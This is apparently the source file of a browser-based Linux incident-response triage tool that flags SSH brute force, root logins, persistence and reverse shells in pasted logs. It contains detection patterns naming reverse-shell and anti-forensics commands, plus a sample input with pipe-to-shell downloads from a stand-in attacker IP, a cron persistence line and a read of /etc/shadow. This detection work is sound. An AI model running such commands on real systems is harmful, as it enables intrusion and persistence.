import { useMemo, useState } from 'react';
import type { Severity as Sev } from '../../components/severity';
import { useNavigate } from 'react-router-dom';
import { BackLink } from '../../components/BackLink';
import { ArrowLeft, AlertTriangle, ShieldAlert, ShieldX, ShieldCheck, Info, FileSearch } from 'lucide-react';

/**
 * Linux IR Triage — 100% client-side.
 *
 * Paste /var/log/auth.log or /secure, `last` / wtmp text, a crontab, or
 * a ~/.bash_history. Heuristics surface the host-compromise signals:
 * SSH brute force, success-after-failure, direct root login, new
 * sudoers / users, persistence via cron, and reverse-shell / download-
 * cradle one-liners. The forensic toolkit is Windows-heavy — this fills
 * the Linux gap. Nothing leaves your browser.
 */

interface Finding {
  sev: Sev;
  title: string;
  detail: string;
  evidence: string;
  fix: string;
}

interface Analysis {
  lines: number;
  findings: Finding[];
}

const SEV_ORDER: Record<Sev, number> = { critical: 0, high: 1, medium: 2, low: 3, info: 4 };

const SEV_STYLE: Record<Sev, { text: string; chip: string; Icon: typeof ShieldAlert }> = {
  critical: {
    text: 'text-rose-700 dark:text-rose-300',
    chip: 'border-rose-500/40 bg-rose-500/10 text-rose-700 dark:text-rose-300',
    Icon: ShieldX,
  },
  high: {
    text: 'text-rose-600 dark:text-rose-400',
    chip: 'border-rose-500/30 bg-rose-500/5 text-rose-600 dark:text-rose-400',
    Icon: ShieldAlert,
  },
  medium: {
    text: 'text-amber-700 dark:text-amber-400',
    chip: 'border-amber-500/30 bg-amber-500/10 text-amber-700 dark:text-amber-400',
    Icon: AlertTriangle,
  },
  low: {
    text: 'text-sky-700 dark:text-sky-400',
    chip: 'border-sky-500/30 bg-sky-500/10 text-sky-700 dark:text-sky-400',
    Icon: Info,
  },
  info: {
    text: 'text-muted',
    chip: 'border-slate-400/30 bg-slate-400/10 text-muted',
    Icon: Info,
  },
};

const REV_SHELL =
  /(bash\s+-i|\/dev\/tcp\/|nc(?:\.traditional)?\s+-[a-z]*e|mkfifo\s+\/tmp|python[0-9]?\s+-c\s+['"]?import\s+(?:socket|pty)|socat\s+.*exec|perl\s+-e.*Socket|ncat\s+.*-e|rm\s+\/tmp\/f.*mkfifo)/i;
const DOWNLOAD_CRADLE = /(curl|wget)\s+[^|;]*\|\s*(sudo\s+)?(ba)?sh\b|base64\s+-d[^|]*\|\s*(ba)?sh\b/i;
const PERSIST =
  /(>>?\s*~?\/?(?:\.ssh\/authorized_keys|\.bashrc|\.profile)|crontab\s+|chattr\s+\+i|systemctl\s+enable|update-rc\.d|\/etc\/cron|nohup\s+|setsid\s+|at\s+now)/i;
const ANTIFOR =
  /(history\s+-c|>\s*~?\/?\.bash_history|unset\s+HISTFILE|shred\s+|rm\s+-rf?\s+\/var\/log|truncate\s+-s\s*0\s+\/var\/log|kill\s+-9\s+\$\$|export\s+HISTFILE=\/dev\/null)/i;
const RECON_TOOLS = /\b(nmap|masscan|linpeas|pspy|enum4linux|hydra|sqlmap|gobuster|nikto|chisel|frpc|socat\s+tcp)\b/i;

function ipFrom(line: string): string {
  const m = line.match(/from\s+(\d{1,3}(?:\.\d{1,3}){3}|[0-9a-f:]+)/i);
  return m ? m[1]! : '?';
}

function analyze(text: string): Analysis | null {
  const trimmed = text.trim();
  if (!trimmed) return null;
  const lines = trimmed.split('\n');
  const findings: Finding[] = [];

  const failByIp = new Map<string, number>();
  const failUsersByIp = new Map<string, Set<string>>();
  const successAfterFail = new Set<string>();
  const invalidUsers = new Set<string>();
  let lineNo = 0;

  for (const rawLine of lines) {
    lineNo++;
    const line = rawLine.trim();
    if (!line) continue;
    const ev = `L${lineNo}: ${line.slice(0, 200)}`;

    // ---- auth.log / secure ----
    if (/sshd\[/.test(line) || /Failed password|Accepted (password|publickey)|sudo:|useradd|new user/i.test(line)) {
      if (/Failed password/i.test(line)) {
        const ip = ipFrom(line);
        failByIp.set(ip, (failByIp.get(ip) ?? 0) + 1);
        const um = line.match(/for(?:\s+invalid\s+user)?\s+(\S+)\s+from/i);
        if (um) {
          const set = failUsersByIp.get(ip) ?? new Set<string>();
          set.add(um[1]!);
          failUsersByIp.set(ip, set);
        }
        if (/invalid user/i.test(line)) invalidUsers.add(ip);
      }
      if (/Accepted (password|publickey)/i.test(line)) {
        const ip = ipFrom(line);
        if ((failByIp.get(ip) ?? 0) >= 5 && !successAfterFail.has(ip)) {
          successAfterFail.add(ip);
          findings.push({
            sev: 'critical',
            title: `Successful SSH login after ${failByIp.get(ip)} failures (${ip})`,
            detail:
              'A source that was brute-forcing then authenticated successfully — treat as a likely account compromise.',
            evidence: ev,
            fix: 'Isolate the host, kill the session, rotate the credential / key, review post-login activity.',
          });
        }
        if (/Accepted \w+ for root /i.test(line)) {
          findings.push({
            sev: 'high',
            title: 'Direct root SSH login',
            detail: 'Root authenticated directly over SSH — most hardened hosts set PermitRootLogin no and use sudo.',
            evidence: ev,
            fix: 'Set `PermitRootLogin no`; require named accounts + sudo. Confirm this was expected.',
          });
        }
      }
      if (/sudo:.*COMMAND=/i.test(line) && /USER=root/i.test(line)) {
        if (/(nc |bash -i|\/bin\/sh|chmod \+s|passwd |visudo|cat \/etc\/shadow|tcpdump|python)/i.test(line)) {
          findings.push({
            sev: 'high',
            title: 'Suspicious sudo-to-root command',
            detail: 'A privilege-elevated command that is a common post-exploitation / persistence action.',
            evidence: ev,
            fix: 'Confirm the operator + change ticket; review what the command did.',
          });
        }
      }
      if (/sudo:.*authentication failure/i.test(line)) {
        findings.push({
          sev: 'medium',
          title: 'sudo authentication failure',
          detail: 'Failed sudo attempt — could be a user error or an attacker probing for sudo rights.',
          evidence: ev,
          fix: 'Correlate with the user’s other activity around this time.',
        });
      }
      if (/useradd|new user:|new group:/i.test(line)) {
        findings.push({
          sev: 'high',
          title: 'New user / group created',
          detail: 'Account creation is a classic persistence step — verify it matches a provisioning action.',
          evidence: ev,
          fix: 'Confirm via change management; delete if unauthorized and hunt for how it was created.',
        });
      }
      if (/to the sudo group|usermod.*-aG\s+sudo|adduser.*sudo|wheel/i.test(line)) {
        findings.push({
          sev: 'high',
          title: 'User added to sudo/wheel group',
          detail: 'Privilege grant — persistence / escalation.',
          evidence: ev,
          fix: 'Verify the change; remove if unauthorized.',
        });
      }
      if (/POSSIBLE BREAK-IN ATTEMPT/i.test(line)) {
        findings.push({
          sev: 'low',
          title: 'Reverse-DNS mismatch (possible break-in attempt)',
          detail: 'sshd logged a PTR/forward mismatch — common with scanners; noteworthy in aggregate.',
          evidence: ev,
          fix: 'Low signal alone; weigh with brute-force counts from the same source.',
        });
      }
      continue;
    }

    // ---- command history / crontab / scripts ----
    if (REV_SHELL.test(line)) {
      findings.push({
        sev: 'critical',
        title: 'Reverse-shell one-liner',
        detail: 'A classic interactive reverse / bind shell pattern.',
        evidence: ev,
        fix: 'Treat the host as compromised; identify the callback IP and scope blast radius.',
      });
      continue;
    }
    if (DOWNLOAD_CRADLE.test(line)) {
      findings.push({
        sev: 'critical',
        title: 'Pipe-to-shell download cradle',
        detail: 'Remote content fetched and piped straight into a shell — primary malware-delivery pattern.',
        evidence: ev,
        fix: 'Recover the URL; analyse what was executed; assume code execution.',
      });
      continue;
    }
    if (ANTIFOR.test(line)) {
      findings.push({
        sev: 'high',
        title: 'Anti-forensics / log tampering',
        detail: 'History clearing or log truncation — defenders’ data being destroyed.',
        evidence: ev,
        fix: 'Pivot to host-external telemetry (auditd, network, EDR); preserve remaining artifacts.',
      });
      continue;
    }
    if (PERSIST.test(line)) {
      findings.push({
        sev: 'high',
        title: 'Persistence mechanism',
        detail: 'authorized_keys / shell-rc / cron / systemd / nohup — keeps access across reboots & logouts.',
        evidence: ev,
        fix: 'Inspect the artifact written; remove unauthorized persistence; hunt for siblings.',
      });
      continue;
    }
    if (RECON_TOOLS.test(line)) {
      findings.push({
        sev: 'medium',
        title: 'Offensive / recon tooling invoked',
        detail: 'Scanning, brute-force, privesc-enum or tunnelling tool referenced.',
        evidence: ev,
        fix: 'Determine whether this is sanctioned testing; if not, scope the activity.',
      });
      continue;
    }
  }

  // Aggregated brute-force
  for (const [ip, n] of failByIp) {
    if (n >= 10 && !successAfterFail.has(ip)) {
      const users = failUsersByIp.get(ip)?.size ?? 0;
      findings.push({
        sev: n >= 50 ? 'high' : 'medium',
        title: `SSH brute force from ${ip} (${n} failures${users ? `, ${users} usernames` : ''})`,
        detail: invalidUsers.has(ip)
          ? 'High-volume failed auth incl. invalid users — username/password spraying.'
          : 'High-volume failed SSH auth from a single source.',
        evidence: `aggregated: ${n} "Failed password" lines from ${ip}`,
        fix: 'Block the source, enable fail2ban/rate-limiting, prefer key-only auth.',
      });
    }
  }

  findings.sort((a, b) => SEV_ORDER[a.sev] - SEV_ORDER[b.sev]);
  return { lines: lines.length, findings };
}

const SAMPLE = [
  'May 18 03:01:11 web1 sshd[2211]: Failed password for invalid user admin from 203.0.113.7 port 51122 ssh2',
  'May 18 03:01:14 web1 sshd[2213]: Failed password for invalid user root from 203.0.113.7 port 51130 ssh2',
  'May 18 03:01:17 web1 sshd[2215]: Failed password for invalid user deploy from 203.0.113.7 port 51140 ssh2',
  'May 18 03:01:20 web1 sshd[2217]: Failed password for invalid user deploy from 203.0.113.7 port 51150 ssh2',
  'May 18 03:01:23 web1 sshd[2219]: Failed password for deploy from 203.0.113.7 port 51160 ssh2',
  'May 18 03:01:31 web1 sshd[2231]: Accepted password for deploy from 203.0.113.7 port 51170 ssh2',
  'May 18 03:02:05 web1 sudo:   deploy : TTY=pts/0 ; PWD=/home/deploy ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow',
  'curl http://203.0.113.7/x.sh | bash',
  '(crontab -l; echo "* * * * * curl -s http://203.0.113.7/b | bash") | crontab -',
  'history -c',
].join('\n');

export default function LinuxTriage(): JSX.Element {
  const navigate = useNavigate();
  const [input, setInput] = useState('');
  const analysis = useMemo(() => analyze(input), [input]);
  const counts = useMemo(() => {
    const c: Record<Sev, number> = { critical: 0, high: 0, medium: 0, low: 0, info: 0 };
    analysis?.findings.forEach((f) => (c[f.sev] += 1));
    return c;
  }, [analysis]);

  function pipeToExtractor() {
    sessionStorage.setItem('ioc-extractor-pipe', input);
    navigate('/dfir/extract?from=linux');
  }

  return (
    <div className="max-w-4xl mx-auto px-4 sm:px-8 py-12 text-slate-900 dark:text-slate-100">
      <BackLink
        to="/dfir"
        className="inline-flex items-center gap-2 text-sm text-muted hover:text-brand-600 dark:hover:text-brand-400 mb-8 font-mono"
      >
        <ArrowLeft size={14} /> back
      </BackLink>

      <div className="animate-fade-in-up">
        <h1 className="text-3xl sm:text-4xl font-display font-semibold mb-2">Linux IR Triage</h1>
        <p className="text-muted mb-6 max-w-2xl">
          Paste <span className="font-mono text-tool">auth.log</span> /{' '}
          <span className="font-mono text-tool">secure</span>, a crontab, or{' '}
          <span className="font-mono text-tool">~/.bash_history</span>. Heuristics surface SSH brute force,
          success-after-failure, direct root login, new sudoers/users, cron persistence, and reverse-shell /
          download-cradle one-liners. Nothing leaves your browser.
        </p>
        <div className="flex flex-wrap gap-2 mb-4">
          <button
            type="button"
            onClick={() => setInput(SAMPLE)}
            className="text-meta font-mono px-2.5 py-1 rounded border border-slate-300 dark:border-[rgb(var(--border-400))] hover:border-brand-500/40 hover:text-brand-600 dark:hover:text-brand-400"
          >
            load example
          </button>
          {input.trim() && (
            <button
              type="button"
              onClick={pipeToExtractor}
              className="text-meta font-mono px-2.5 py-1 rounded border border-slate-300 dark:border-[rgb(var(--border-400))] hover:border-brand-500/40 hover:text-brand-600 dark:hover:text-brand-400 inline-flex items-center gap-1"
            >
              <FileSearch size={11} /> Extract IOCs →
            </button>
          )}
          {input && (
            <button
              type="button"
              onClick={() => setInput('')}
              className="text-meta font-mono px-2.5 py-1 rounded border border-slate-300 dark:border-[rgb(var(--border-400))] hover:border-rose-500/40 hover:text-rose-600 dark:hover:text-rose-400"
            >
              clear
            </button>
          )}
        </div>
      </div>

      <label htmlFor="lx-input" className="sr-only">
        Linux log / history text
      </label>
      <textarea
        id="lx-input"
        value={input}
        onChange={(e) => setInput(e.target.value)}
        placeholder="May 18 03:01:11 host sshd[2211]: Failed password for invalid user admin from 203.0.113.7 …"
        rows={12}
        spellCheck={false}
        aria-label="Linux log / history text"
        className="w-full px-4 py-3 bg-white dark:bg-[rgb(var(--surface-200))] border border-slate-200 dark:border-[rgb(var(--border-400))] rounded-lg font-mono text-tool text-slate-900 dark:text-slate-100 placeholder:text-slate-500 focus:outline-none focus:border-brand-500 dark:focus:border-brand-400"
      />

      {analysis && (
        <div className="mt-8 space-y-6">
          <section className="rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] shadow-e1 p-5">
            <div className="flex flex-wrap items-center gap-x-6 gap-y-2 text-sm">
              <span>
                <span className="text-slate-500">Lines:</span> <span className="font-mono">{analysis.lines}</span>
              </span>
              <span className="flex flex-wrap gap-1.5">
                {(['critical', 'high', 'medium', 'low', 'info'] as Sev[])
                  .filter((s) => counts[s] > 0)
                  .map((s) => (
                    <span
                      key={s}
                      className={`text-mini font-mono uppercase tracking-wider px-1.5 py-0.5 rounded border ${SEV_STYLE[s].chip}`}
                    >
                      {counts[s]} {s}
                    </span>
                  ))}
              </span>
            </div>
          </section>

          {analysis.findings.length === 0 && (
            <section className="rounded-lg border border-emerald-500/30 bg-emerald-500/5 p-5 flex items-start gap-2 text-sm text-emerald-700 dark:text-emerald-400">
              <ShieldCheck size={16} className="mt-0.5 flex-shrink-0" />
              <span>
                No host-compromise heuristics matched. Absence of signal ≠ clean — correlate with auditd / EDR.
              </span>
            </section>
          )}

          {analysis.findings.length > 0 && (
            <section className="space-y-3">
              {analysis.findings.map((f, idx) => {
                const st = SEV_STYLE[f.sev];
                return (
                  <div
                    key={`${f.title}-${idx}`}
                    className="rounded-lg border border-slate-200 dark:border-[rgb(var(--border-400))] bg-white dark:bg-[rgb(var(--surface-200))] shadow-e1 p-4"
                  >
                    <div className="flex items-start gap-2.5">
                      <st.Icon size={16} className={`mt-0.5 flex-shrink-0 ${st.text}`} />
                      <div className="min-w-0 flex-1">
                        <span
                          className={`text-micro font-mono uppercase tracking-wider px-1.5 py-0.5 rounded border ${st.chip}`}
                        >
                          {f.sev}
                        </span>
                        <h3 className={`font-display font-semibold mt-1.5 ${st.text}`}>{f.title}</h3>
                        <p className="text-sm text-muted mt-1 leading-relaxed">{f.detail}</p>
                        <pre className="text-meta font-mono text-slate-500 mt-2 whitespace-pre-wrap break-all bg-slate-50 dark:bg-[rgb(var(--input-200))] rounded p-2 border border-slate-200 dark:border-[rgb(var(--border-400))]">
                          {f.evidence}
                        </pre>
                        <p className="text-tool text-slate-700 dark:text-slate-300 mt-2">
                          <span className="text-slate-500 font-mono text-mini uppercase tracking-wider">fix</span>{' '}
                          {f.fix}
                        </p>
                      </div>
                    </div>
                  </div>
                );
              })}
            </section>
          )}
        </div>
      )}
    </div>
  );
}
